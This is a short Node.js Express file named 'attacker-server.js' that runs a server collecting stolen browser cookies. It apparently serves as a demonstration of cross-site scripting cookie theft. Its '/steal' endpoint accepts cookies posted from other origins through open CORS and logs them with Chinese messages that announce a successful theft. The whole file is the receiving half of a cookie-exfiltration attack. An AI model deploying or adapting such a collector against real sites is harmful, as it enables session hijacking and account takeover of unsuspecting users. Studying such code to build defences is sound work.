// attacker-server.js
const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');

const app = express();
app.use(cors());
app.use(bodyParser.json());

app.post('/steal', (req, res) => {
    const stolenCookie = req.body.cookie;
    console.log('成功窃取 Cookie:', stolenCookie);
    res.send('Cookie 接收成功');
});

app.listen(3000, () => {
    console.log('攻击者服务器已启动 - http://localhost:3000');
});
